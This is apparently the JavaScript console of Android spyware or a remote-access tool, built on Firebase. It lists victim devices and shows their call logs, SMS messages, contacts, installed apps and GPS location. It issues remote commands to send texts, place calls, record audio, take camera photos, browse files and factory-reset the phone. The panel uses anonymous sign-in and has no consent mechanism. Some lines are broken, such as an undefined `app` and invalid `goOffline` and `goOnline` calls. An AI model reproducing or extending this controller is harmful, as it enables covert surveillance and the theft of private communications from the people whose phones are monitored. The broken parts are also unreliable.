// Enhanced Firebase v9+ SDK with premium features
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js';
import { getDatabase, ref, onValue, set, limitToLast, off, query, orderByKey, orderByChild } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyDOCAbC123dEf456GhI789jKl01MnO2PqR",
    authDomain: "your-project.firebaseapp.com",
    databaseURL: "https://your-project-default-rtdb.firebaseio.com/",
    projectId: "your-project",
    storageBucket: "your-project.appspot.com",
    messagingSenderId: "123456789012",
    appId: "1:123456789012:web:abc123def456ghi789jkl0"
};

// Initialize Firebase
initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);

// Enable offline persistence
database.goOffline();
database.goOnline();

// Global state
let selectedUid = null;
let activeListeners = new Map();
let allDevices = {};
let searchTerm = '';
let currentStats = {
  totalDevices: 0,
  onlineDevices: 0,
  totalCalls: 0,
  totalSms: 0
};

// DOM elements
const elements = {
  // Header
  connectionStatus: document.getElementById('connectionStatus'),
  connectionText: document.getElementById('connectionText'),
  searchInput: document.getElementById('searchInput'),

  // Stats
  totalDevices: document.getElementById('totalDevices'),
  onlineDevices: document.getElementById('onlineDevices'),
  totalCalls: document.getElementById('totalCalls'),
  totalSms: document.getElementById('totalSms'),

  // Devices
  devicesBody: document.getElementById('devicesBody'),
  refreshDevices: document.getElementById('refreshDevices'),

  // Modal
  deviceModal: document.getElementById('deviceModal'),
  modalTitle: document.getElementById('modalTitle'),
  closeModal: document.getElementById('closeModal'),

  // Device details
  deviceName: document.getElementById('deviceName'),
  deviceModel: document.getElementById('deviceModel'),
  deviceStatusBadge: document.getElementById('deviceStatusBadge'),
  profileBox: document.getElementById('profileBox'),

  // Calls
  callsList: document.getElementById('callsList'),
  totalCallsCount: document.getElementById('totalCallsCount'),
  missedCallsCount: document.getElementById('missedCallsCount'),

  // SMS
  smsList: document.getElementById('smsList'),
  smsForm: document.getElementById('smsForm'),
  smsTo: document.getElementById('smsTo'),
  smsMessage: document.getElementById('smsMessage'),
  smsStatus: document.getElementById('smsStatus'),
  sendSmsBtn: document.getElementById('sendSmsBtn'),
  sendSmsSection: document.getElementById('sendSmsSection'),
  cancelSms: document.getElementById('cancelSms'),

  // Commands
  lastResultBox: document.getElementById('lastResultBox'),

  // Location
  locationDetails: document.getElementById('locationDetails'),
  latitude: document.getElementById('latitude'),
  longitude: document.getElementById('longitude'),
  accuracy: document.getElementById('accuracy'),
  locationTime: document.getElementById('locationTime'),

  // Mobile
  mobileMenuToggle: document.getElementById('mobileMenuToggle'),
  sidebar: document.getElementById('sidebar'),

  // Notifications
  notifications: document.getElementById('notifications'),

  // Loading
  loadingOverlay: document.getElementById('loadingOverlay')
};

// Utility functions
function debug(msg, obj = null) {
  const timestamp = new Date().toLocaleTimeString();
  console.log(`[${timestamp}] ${msg}`, obj || '');
}

function showNotification(message, type = 'info', duration = 5000) {
  const notification = document.createElement('div');
  notification.className = `notification ${type}`;
  notification.innerHTML = `
    <div style="display: flex; align-items: center; gap: 12px;">
      <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
      <span>${message}</span>
    </div>
  `;

  elements.notifications.appendChild(notification);

  setTimeout(() => {
    notification.remove();
  }, duration);
}

function updateConnectionStatus(connected) {
  if (connected) {
    elements.connectionStatus.className = 'status-dot online';
    elements.connectionText.textContent = 'Connected';
  } else {
    elements.connectionStatus.className = 'status-dot offline';
    elements.connectionText.textContent = 'Disconnected';
  }
}

function formatTimestamp(timestamp) {
  if (!timestamp) return '-';
  const date = new Date(timestamp);
  const now = new Date();
  const diff = now - date;

  if (diff < 60000) return 'Just now';
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;

  return date.toLocaleDateString();
}

function formatTime(timestamp) {
  if (!timestamp) return '-';
  return new Date(timestamp).toLocaleString();
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function showLoading() {
  elements.loadingOverlay.classList.add('active');
}

function hideLoading() {
  elements.loadingOverlay.classList.remove('active');
}

// Stats functions
function updateStats() {
  const devices = Object.values(allDevices);
  const now = Date.now();

  currentStats.totalDevices = devices.length;
  currentStats.onlineDevices = devices.filter(device => 
    device.last_checkin && (now - device.last_checkin) < 300000
  ).length;

  // Calculate today's calls and SMS
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const todayTimestamp = today.getTime();

  let totalCalls = 0;
  let totalSms = 0;

  devices.forEach(device => {
    if (device.calls) {
      totalCalls += Object.values(device.calls).filter(call => 
        call.date && call.date >= todayTimestamp
      ).length;
    }
    if (device.sms) {
      totalSms += Object.values(device.sms).filter(sms => 
        sms.date && sms.date >= todayTimestamp
      ).length;
    }
  });

  currentStats.totalCalls = totalCalls;
  currentStats.totalSms = totalSms;

  // Update UI
  animateCounter(elements.totalDevices, currentStats.totalDevices);
  animateCounter(elements.onlineDevices, currentStats.onlineDevices);
  animateCounter(elements.totalCalls, currentStats.totalCalls);
  animateCounter(elements.totalSms, currentStats.totalSms);
}

function animateCounter(element, targetValue) {
  const currentValue = parseInt(element.textContent) || 0;
  const increment = Math.ceil((targetValue - currentValue) / 10);

  if (currentValue !== targetValue) {
    element.textContent = Math.min(currentValue + increment, targetValue);
    if (currentValue + increment < targetValue) {
      setTimeout(() => animateCounter(element, targetValue), 50);
    }
  }
}

// Device functions
function renderDevices(devices) {
  try {
    allDevices = devices || {};
    const entries = Object.entries(allDevices);

    // Filter by search term
    const filteredEntries = entries.filter(([uid, device]) => {
      if (!searchTerm) return true;
      const searchLower = searchTerm.toLowerCase();
      const name = (device.device_name || device.model || uid).toLowerCase();
      const model = (device.model || '').toLowerCase();
      return name.includes(searchLower) || model.includes(searchLower) || uid.includes(searchLower);
    });

    elements.devicesBody.innerHTML = '';

    if (filteredEntries.length === 0) {
      elements.devicesBody.innerHTML = `
        <tr>
          <td colspan="8" class="loading">
            ${searchTerm ? 'No devices match your search' : 'No devices found'}
          </td>
        </tr>
      `;
      updateStats();
      return;
    }

    // Sort by last check-in time
    filteredEntries.sort((a, b) => (b[1]?.last_checkin || 0) - (a[1]?.last_checkin || 0));

    filteredEntries.forEach(([uid, device]) => {
      const tr = document.createElement('tr');
      tr.onclick = () => selectDevice(uid, device);
      tr.style.cursor = 'pointer';

      const name = device.device_name || device.model || uid.substring(0, 8);
      const model = device.model || '-';
      const os = device.os_version || '-';
      const lastCheckin = formatTimestamp(device.last_checkin);
      const location = device.location ? `${device.location.latitude?.toFixed(4)}, ${device.location.longitude?.toFixed(4)}` : '-';

      // Status indicator
      const isOnline = device.last_checkin && (Date.now() - device.last_checkin) < 300000;
      const statusClass = isOnline ? 'text-success' : 'text-error';
      const statusText = isOnline ? 'Online' : 'Offline';

      tr.innerHTML = `
        <td>
          <input type="checkbox" class="device-checkbox" value="${uid}">
        </td>
        <td>
          <div style="display: flex; align-items: center; gap: 12px;">
            <div class="device-avatar" style="width: 40px; height: 40px; background: var(--primary); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-size: 16px;">
              <i class="fas fa-mobile-alt"></i>
            </div>
            <div>
              <div style="font-weight: 600;">${escapeHtml(name)}</div>
              <div style="font-size: 12px; color: var(--text-muted);">${uid.substring(0, 8)}...</div>
            </div>
          </div>
        </td>
        <td>
          <span class="device-status ${isOnline ? 'online' : 'offline'}">${statusText}</span>
        </td>
        <td>${escapeHtml(model)}</td>
        <td>${escapeHtml(os)}</td>
        <td>${escapeHtml(lastCheckin)}</td>
        <td>${escapeHtml(location)}</td>
        <td>
          <button type="button" class="btn btn-primary btn-sm" onclick="event.stopPropagation(); selectDevice('${uid}', ${JSON.stringify(device).replace(/"/g, '&quot;')})">
            <i class="fas fa-eye"></i>
            View
          </button>
        </td>
      `;

      elements.devicesBody.appendChild(tr);
    });

    updateStats();
    debug('Devices rendered', { total: entries.length, filtered: filteredEntries.length });
  } catch (error) {
    debug('Error rendering devices', error.message);
    elements.devicesBody.innerHTML = '<tr><td colspan="8" class="loading">Error loading devices</td></tr>';
    showNotification('Error loading devices: ' + error.message, 'error');
  }
}

function selectDevice(uid, device) {
  try {
    debug('Selecting device', { uid, device: device.model });

    selectedUid = uid;

    // Update modal title and device info
    const deviceName = device.device_name || device.model || uid;
    elements.modalTitle.textContent = `Device: ${deviceName}`;
    elements.deviceName.textContent = deviceName;
    elements.deviceModel.textContent = device.model || 'Unknown Model';

    // Update status badge
    const isOnline = device.last_checkin && (Date.now() - device.last_checkin) < 300000;
    elements.deviceStatusBadge.textContent = isOnline ? 'Online' : 'Offline';
    elements.deviceStatusBadge.className = `device-status ${isOnline ? 'online' : 'offline'}`;

    // Update profile display
    const profile = {
      uid: uid,
      device_name: device.device_name,
      model: device.model,
      manufacturer: device.manufacturer,
      os_version: device.os_version,
      app_version: device.app_version,
      last_checkin: formatTime(device.last_checkin),
      registered_at: formatTime(device.registered_at),
      location: device.location
    };
    elements.profileBox.textContent = JSON.stringify(profile, null, 2);

    // Clear previous listeners
    cleanupListeners();

    // Setup new listeners
    setupDeviceListeners(uid);

    // Show modal
    elements.deviceModal.classList.add('active');

    // Set active tab to profile
    setActiveTab('profile');

  } catch (error) {
    debug('Error selecting device', error.message);
    showNotification('Error selecting device: ' + error.message, 'error');
  }
}

function cleanupListeners() {
  activeListeners.forEach((unsubscribe, key) => {
    try {
      unsubscribe();
      debug('Cleaned up listener', key);
    } catch (error) {
      debug('Error cleaning up listener', { key, error: error.message });
    }
  });
  activeListeners.clear();
}

function setupDeviceListeners(uid) {
  try {
    // Calls listener
    const callsRef = ref(database, `devices/${uid}/calls`);
    const callsQuery = query(callsRef, orderByKey(), limitToLast(100));

    const callsUnsubscribe = onValue(callsQuery, (snapshot) => {
      renderCalls(snapshot.val() || {});
    }, (error) => {
      debug('Calls listener error', error.message);
    });

    // SMS listener
    const smsRef = ref(database, `devices/${uid}/sms`);
    const smsQuery = query(smsRef, orderByKey(), limitToLast(100));

    const smsUnsubscribe = onValue(smsQuery, (snapshot) => {
      renderSms(snapshot.val() || {});
    }, (error) => {
      debug('SMS listener error', error.message);
    });

    // Command result listener
    const resultRef = ref(database, `commands/${uid}/last_result`);
    const resultUnsubscribe = onValue(resultRef, (snapshot) => {
      const result = snapshot.val() || { info: 'No results yet' };
      elements.lastResultBox.textContent = JSON.stringify(result, null, 2);
      debug('Command result update', result);
    }, (error) => {
      debug('Command result listener error', error.message);
    });

    // Store cleanup functions
    activeListeners.set('calls', callsUnsubscribe);
    activeListeners.set('sms', smsUnsubscribe);
    activeListeners.set('result', resultUnsubscribe);

    debug('Device listeners setup complete', { uid });

  } catch (error) {
    debug('Error setting up device listeners', error.message);
  }
}

function renderCalls(calls) {
  try {
    const entries = Object.entries(calls);
    elements.callsList.innerHTML = '';

    if (entries.length === 0) {
      elements.callsList.innerHTML = '<div class="loading">No call data available</div>';
      elements.totalCallsCount.textContent = '0';
      elements.missedCallsCount.textContent = '0';
      return;
    }

    // Sort by date descending
    entries.sort((a, b) => (b[1]?.date || 0) - (a[1]?.date || 0));

    let missedCount = 0;

    entries.slice(0, 50).forEach(([key, call]) => {
      if (call.type === 'missed') missedCount++;

      const callItem = document.createElement('div');
      callItem.className = 'call-item';
      callItem.innerHTML = `
        <div class="call-info">
          <div class="call-number">${escapeHtml(call.number || 'Unknown')}</div>
          <div class="call-time">${formatTime(call.date)}</div>
        </div>
        <div style="display: flex; align-items: center; gap: 12px;">
          <span class="call-type ${call.type || 'other'}">${call.type || 'other'}</span>
          ${call.duration ? `<span style="font-size: 12px; color: var(--text-muted);">${call.duration}s</span>` : ''}
        </div>
      `;
      elements.callsList.appendChild(callItem);
    });

    elements.totalCallsCount.textContent = entries.length.toString();
    elements.missedCallsCount.textContent = missedCount.toString();

    debug('Calls rendered', { count: entries.length, missed: missedCount });
  } catch (error) {
    debug('Error rendering calls', error.message);
    elements.callsList.innerHTML = '<div class="loading">Error loading calls</div>';
  }
}

function renderSms(smsData) {
  try {
    const entries = Object.entries(smsData);
    elements.smsList.innerHTML = '';

    if (entries.length === 0) {
      elements.smsList.innerHTML = '<div class="loading">No SMS data available</div>';
      return;
    }

    // Sort by date descending
    entries.sort((a, b) => (b[1]?.date || 0) - (a[1]?.date || 0));

    entries.slice(0, 50).forEach(([key, sms]) => {
      const smsItem = document.createElement('div');
      smsItem.className = 'sms-item';

      const isReceived = sms.type === 'received' || sms.type === 'inbox';
      const typeIcon = isReceived ? 'fa-arrow-down' : 'fa-arrow-up';
      const typeColor = isReceived ? 'var(--success)' : 'var(--primary)';

      smsItem.innerHTML = `
        <div class="sms-info">
          <div class="sms-sender">
            <i class="fas ${typeIcon}" style="color: ${typeColor}; margin-right: 8px;"></i>
            ${escapeHtml(sms.address || 'Unknown')}
          </div>
          <div style="margin: 8px 0; font-size: 14px;">${escapeHtml(sms.body || '')}</div>
          <div class="sms-time">${formatTime(sms.date)}</div>
        </div>
      `;
      elements.smsList.appendChild(smsItem);
    });

    debug('SMS rendered', { count: entries.length });
  } catch (error) {
    debug('Error rendering SMS', error.message);
    elements.smsList.innerHTML = '<div class="loading">Error loading SMS</div>';
  }
}

// Tab management
function setActiveTab(tabName) {
  // Remove active class from all tabs
  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

  // Add active class to selected tab
  const tabBtn = document.querySelector(`[data-tab="${tabName}"]`);
  const tabContent = document.getElementById(`tab-${tabName}`);

  if (tabBtn) tabBtn.classList.add('active');
  if (tabContent) tabContent.classList.add('active');
}

// SMS functions
async function sendSmsCommand(uid, to, message) {
  if (!to || !message) {
    elements.smsStatus.textContent = 'Please enter both phone number and message';
    elements.smsStatus.className = 'status-message error';
    return;
  }

  try {
    elements.smsStatus.textContent = 'Sending command...';
    elements.smsStatus.className = 'status-message';
    debug('Sending SMS command', { uid, to });

    const commandRef = ref(database, `commands/${uid}/send_sms`);
    await set(commandRef, {
      to: to,
      message: message,
      requested_at: Date.now()
    });

    debug('SMS command sent successfully');
    elements.smsStatus.textContent = 'Command sent! Waiting for device response...';
    elements.smsStatus.className = 'status-message success';
    elements.smsMessage.value = '';

    showNotification('SMS command sent successfully', 'success');

  } catch (error) {
    debug('Error sending SMS command', error.message);
    elements.smsStatus.textContent = `Error: ${error.message}`;
    elements.smsStatus.className = 'status-message error';
    showNotification('Failed to send SMS command: ' + error.message, 'error');
  }
}

// Quick command functions
async function executeQuickCommand(command) {
  if (!selectedUid) {
    showNotification('Please select a device first', 'error');
    return;
  }

  try {
    showLoading();

    const commandRef = ref(database, `commands/${selectedUid}/${command}`);
    const commandData = {
      requested_at: Date.now(),
      status: 'pending'
    };

    // Add specific data for certain commands
    switch (command) {
      case 'location':
        commandData.action = 'get_location';
        break;
      case 'screenshot':
        commandData.action = 'take_screenshot';
        break;
      case 'lock':
        commandData.action = 'lock_device';
        break;
      case 'wipe':
        if (!confirm('Are you sure you want to factory reset this device? This action cannot be undone.')) {
          hideLoading();
          return;
        }
        commandData.action = 'factory_reset';
        break;
    }

    await set(commandRef, commandData);

    hideLoading();
    showNotification(`${command} command sent successfully`, 'success');
    debug(`Quick command sent: ${command}`, commandData);

  } catch (error) {
    hideLoading();
    debug(`Error sending ${command} command`, error.message);
    showNotification(`Failed to send ${command} command: ${error.message}`, 'error');
  }
}

// Authentication functions
async function initializeAuth() {
  try {
    await signInAnonymously(auth);
    debug('Signed in anonymously successfully');
  } catch (error) {
    debug('Auth signIn error', { message: error.message, code: error.code });
    throw error;
  }
}

// Event listeners
function setupEventListeners() {
  // Search functionality
  elements.searchInput?.addEventListener('input', (e) => {
    searchTerm = e.target.value.trim();
    renderDevices(allDevices);
  });

  // Refresh devices
  elements.refreshDevices?.addEventListener('click', () => {
    showNotification('Refreshing devices...', 'info', 2000);
    renderDevices(allDevices);
  });

  // Modal controls
  elements.closeModal?.addEventListener('click', () => {
    elements.deviceModal.classList.remove('active');
    cleanupListeners();
  });

  // Click outside modal to close
  elements.deviceModal?.addEventListener('click', (e) => {
    if (e.target === elements.deviceModal) {
      elements.deviceModal.classList.remove('active');
      cleanupListeners();
    }
  });

  // Tab switching
  document.addEventListener('click', (e) => {
    if (e.target.classList.contains('tab-btn')) {
      const tabName = e.target.dataset.tab;
      if (tabName) setActiveTab(tabName);
    }
  });

  // SMS form
  elements.smsForm?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (selectedUid) {
      sendSmsCommand(selectedUid, elements.smsTo.value.trim(), elements.smsMessage.value.trim());
    } else {
      showNotification('Please select a device first', 'error');
    }
  });

  // SMS character count
  elements.smsMessage?.addEventListener('input', function() {
    const charCount = this.value.length;
    const charCountElement = document.querySelector('.char-count');
    if (charCountElement) {
      charCountElement.textContent = `${charCount}/500 characters`;
      charCountElement.style.color = charCount > 450 ? 'var(--error)' : 'var(--text-muted)';
    }
  });

  // SMS controls
  elements.sendSmsBtn?.addEventListener('click', () => {
    elements.sendSmsSection.style.display = elements.sendSmsSection.style.display === 'none' ? 'block' : 'none';
  });

  elements.cancelSms?.addEventListener('click', () => {
    elements.sendSmsSection.style.display = 'none';
    elements.smsForm.reset();
    elements.smsStatus.textContent = '';
  });

  // Phone number validation
  elements.smsTo?.addEventListener('input', function() {
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    const isValid = phoneRegex.test(this.value.trim());
    this.style.borderColor = this.value.trim() === '' ? '' : (isValid ? 'var(--success)' : 'var(--error)');
  });

  // Quick commands
  document.addEventListener('click', (e) => {
    if (e.target.classList.contains('quick-cmd-btn') || e.target.closest('.quick-cmd-btn')) {
      const btn = e.target.classList.contains('quick-cmd-btn') ? e.target : e.target.closest('.quick-cmd-btn');
      const command = btn.dataset.cmd;
      if (command) executeQuickCommand(command);
    }
  });

  // Enhanced command buttons
  document.addEventListener('click', (e) => {
    if (e.target.classList.contains('enhanced-cmd-btn') || e.target.closest('.enhanced-cmd-btn')) {
      const btn = e.target.classList.contains('enhanced-cmd-btn') ? e.target : e.target.closest('.enhanced-cmd-btn');
      const command = btn.dataset.cmd;
      if (command) executeEnhancedCommand(command);
    }
  });

  // Mobile menu toggle
  elements.mobileMenuToggle?.addEventListener('click', () => {
    elements.sidebar.classList.toggle('open');
  });

  // Select all devices
  document.getElementById('selectAll')?.addEventListener('change', (e) => {
    const checkboxes = document.querySelectorAll('.device-checkbox');
    checkboxes.forEach(cb => cb.checked = e.target.checked);
  });

  // Keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && elements.deviceModal.classList.contains('active')) {
      elements.deviceModal.classList.remove('active');
      cleanupListeners();
    }

    if (e.ctrlKey || e.metaKey) {
      switch (e.key) {
        case 'f':
          e.preventDefault();
          elements.searchInput?.focus();
          break;
        case 'r':
          e.preventDefault();
          renderDevices(allDevices);
          break;
      }
    }
  });
}

// Auth state listener
onAuthStateChanged(auth, async (user) => {
  debug('Auth state changed', user ? { uid: user.uid } : null);

  if (!user) {
    debug('User not authenticated, attempting sign in');
    updateConnectionStatus(false);
    try {
      await initializeAuth();
    } catch (error) {
      debug('Failed to authenticate', error.message);
      showNotification('Authentication failed: ' + error.message, 'error');
      return;
    }
    return;
  }

  try {
    updateConnectionStatus(true);
    showNotification('Connected to Firebase', 'success', 3000);

    // Test database connectivity
    const connectedRef = ref(database, '.info/connected');
    onValue(connectedRef, (snapshot) => {
      const connected = snapshot.val();
      debug('.info/connected status', connected);
      updateConnectionStatus(connected);
    }, (error) => {
      debug('.info/connected error', error.message);
      updateConnectionStatus(false);
    });

    // Listen to devices
    const devicesRef = ref(database, 'devices');
    onValue(devicesRef, (snapshot) => {
      const devices = snapshot.val() || {};
      debug('Devices snapshot received', { count: Object.keys(devices).length });
      renderDevices(devices);
    }, (error) => {
      debug('Devices listener error', error.message);
      elements.devicesBody.innerHTML = '<tr><td colspan="8" class="loading">Permission denied - check Firebase rules</td></tr>';
      showNotification('Permission denied - check Firebase database rules', 'error');
    });

  } catch (error) {
    debug('Database initialization error', error.message);
    updateConnectionStatus(false);
    showNotification('Database connection failed: ' + error.message, 'error');
  }
});

// Initialize on DOM load
document.addEventListener('DOMContentLoaded', () => {
  debug('DOM loaded, initializing admin panel');

  // Setup event listeners
  setupEventListeners();

  // Initialize authentication
  initializeAuth().catch(error => {
    debug('Initial auth failed', error.message);
    showNotification('Failed to initialize: ' + error.message, 'error');
  });
});

debug('Starting enhanced admin panel with premium features');



// Enhanced Remote Control Commands
async function executeEnhancedCommand(command) {
  if (!selectedUid) {
    showNotification('Please select a device first', 'error');
    return;
  }

  try {
    showLoading();

    const commandRef = ref(database, `commands/${selectedUid}/${command}`);
    let commandData = {
      requested_at: Date.now(),
      status: 'pending'
    };

    // Add specific data for enhanced commands
    switch (command) {
      case 'record_audio':
        const duration = prompt('Enter recording duration in seconds (default: 10):') || '10';
        commandData.duration = parseInt(duration);
        break;
      case 'take_photo':
        const camera = confirm('Use front camera? (Cancel for back camera)') ? 'front' : 'back';
        commandData.camera = camera;
        break;
      case 'make_call':
        const number = prompt('Enter phone number to call:');
        if (!number) {
          hideLoading();
          return;
        }
        commandData.number = number;
        break;
      case 'set_volume':
        const volume = prompt('Enter volume level (0-100):') || '50';
        const type = prompt('Enter volume type (media/ring/alarm/notification):') || 'media';
        commandData.volume = parseInt(volume);
        commandData.type = type;
        break;
      case 'toggle_wifi':
        const enable = confirm('Enable WiFi? (Cancel to disable)');
        commandData.enable = enable;
        break;
      case 'get_file_list':
        const path = prompt('Enter directory path (leave empty for default):') || '';
        if (path) commandData.path = path;
        break;
      case 'vibrate':
        const vibDuration = prompt('Enter vibration duration in milliseconds (default: 1000):') || '1000';
        commandData.duration = parseInt(vibDuration);
        break;
    }

    await set(commandRef, commandData);

    hideLoading();
    showNotification(`${command} command sent successfully`, 'success');
    debug(`Enhanced command sent: ${command}`, commandData);

  } catch (error) {
    hideLoading();
    debug(`Error sending ${command} command`, error.message);
    showNotification(`Failed to send ${command} command: ${error.message}`, 'error');
  }
}

// Enhanced device data display
function displayEnhancedDeviceData(uid) {
  const enhancedDataRef = ref(database, `commands/${uid}/last_result`);

  const unsubscribe = onValue(enhancedDataRef, (snapshot) => {
    const result = snapshot.val();
    if (result && result.data) {
      updateEnhancedDataDisplay(result);
    }
  });

  activeListeners.set('enhanced_data', unsubscribe);
}

function updateEnhancedDataDisplay(result) {
  const dataContainer = document.getElementById('enhancedDataDisplay');
  if (!dataContainer) return;

  let displayHTML = '';

  switch (result.command_type) {
    case 'get_location':
      if (result.data) {
        displayHTML = `
          <div class="data-section">
            <h4><i class="fas fa-map-marker-alt"></i> Location Data</h4>
            <div class="data-grid">
              <div class="data-item">
                <label>Latitude:</label>
                <span>${result.data.latitude?.toFixed(6) || 'N/A'}</span>
              </div>
              <div class="data-item">
                <label>Longitude:</label>
                <span>${result.data.longitude?.toFixed(6) || 'N/A'}</span>
              </div>
              <div class="data-item">
                <label>Accuracy:</label>
                <span>${result.data.accuracy || 'N/A'}m</span>
              </div>
              <div class="data-item">
                <label>Altitude:</label>
                <span>${result.data.altitude || 'N/A'}m</span>
              </div>
            </div>
          </div>
        `;
      }
      break;

    case 'get_contacts':
      if (result.data && result.data.contacts) {
        displayHTML = `
          <div class="data-section">
            <h4><i class="fas fa-address-book"></i> Contacts (${result.data.count})</h4>
            <div class="contacts-list">
              ${result.data.contacts.slice(0, 20).map(contact => `
                <div class="contact-item">
                  <span class="contact-name">${escapeHtml(contact.name)}</span>
                  <span class="contact-phone">${escapeHtml(contact.phone)}</span>
                </div>
              `).join('')}
              ${result.data.contacts.length > 20 ? `<div class="show-more">... and ${result.data.contacts.length - 20} more</div>` : ''}
            </div>
          </div>
        `;
      }
      break;

    case 'get_installed_apps':
      if (result.data && result.data.apps) {
        displayHTML = `
          <div class="data-section">
            <h4><i class="fas fa-mobile-alt"></i> Installed Apps (${result.data.count})</h4>
            <div class="apps-list">
              ${result.data.apps.slice(0, 15).map(app => `
                <div class="app-item">
                  <div class="app-info">
                    <span class="app-name">${escapeHtml(app.app_name)}</span>
                    <span class="app-package">${escapeHtml(app.package_name)}</span>
                  </div>
                  <span class="app-version">${app.version_name || 'N/A'}</span>
                </div>
              `).join('')}
              ${result.data.apps.length > 15 ? `<div class="show-more">... and ${result.data.apps.length - 15} more apps</div>` : ''}
            </div>
          </div>
        `;
      }
      break;

    case 'get_wifi_info':
      if (result.data) {
        displayHTML = `
          <div class="data-section">
            <h4><i class="fas fa-wifi"></i> WiFi Information</h4>
            <div class="data-grid">
              <div class="data-item">
                <label>Status:</label>
                <span class="${result.data.is_enabled ? 'text-success' : 'text-error'}">${result.data.is_enabled ? 'Enabled' : 'Disabled'}</span>
              </div>
              <div class="data-item">
                <label>SSID:</label>
                <span>${result.data.ssid || 'Not connected'}</span>
              </div>
              <div class="data-item">
                <label>Signal Strength:</label>
                <span>${result.data.signal_strength || 'N/A'} dBm</span>
              </div>
              <div class="data-item">
                <label>Link Speed:</label>
                <span>${result.data.link_speed || 'N/A'} Mbps</span>
              </div>
            </div>
          </div>
        `;
      }
      break;

    case 'get_device_info':
      if (result.data) {
        displayHTML = `
          <div class="data-section">
            <h4><i class="fas fa-info-circle"></i> Device Information</h4>
            <div class="data-grid">
              <div class="data-item">
                <label>Model:</label>
                <span>${result.data.manufacturer} ${result.data.model}</span>
              </div>
              <div class="data-item">
                <label>Android Version:</label>
                <span>${result.data.android_version} (API ${result.data.api_level})</span>
              </div>
              <div class="data-item">
                <label>Network Operator:</label>
                <span>${result.data.network_operator || 'N/A'}</span>
              </div>
              <div class="data-item">
                <label>Power Save Mode:</label>
                <span class="${result.data.is_power_save_mode ? 'text-warning' : 'text-success'}">${result.data.is_power_save_mode ? 'Enabled' : 'Disabled'}</span>
              </div>
            </div>
          </div>
        `;
      }
      break;
  }

  if (displayHTML) {
    dataContainer.innerHTML = displayHTML;
    dataContainer.style.display = 'block';
  }
}